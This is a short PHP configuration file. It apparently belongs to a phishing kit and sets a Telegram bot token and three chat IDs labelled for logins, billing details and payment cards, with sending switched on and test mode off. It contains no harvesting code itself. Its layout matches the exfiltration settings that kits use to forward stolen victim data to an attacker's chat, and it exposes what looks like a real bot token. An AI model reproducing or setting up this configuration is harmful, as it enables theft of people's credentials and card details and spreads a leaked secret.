<?php
$telegram_sending = true;                                       # 
$bot_token2 = "7338704737:AAGCQ3W20UCLvq4wS6Fwl5LhLwVLAeVeV0g";
$chat_login2 = "-1002409921546";                                 # 
$chat_billing2 = "-1002409921546";                               # 
$chat_card2 = "-1002409921546";                                  # 


$test_mode = false;

?>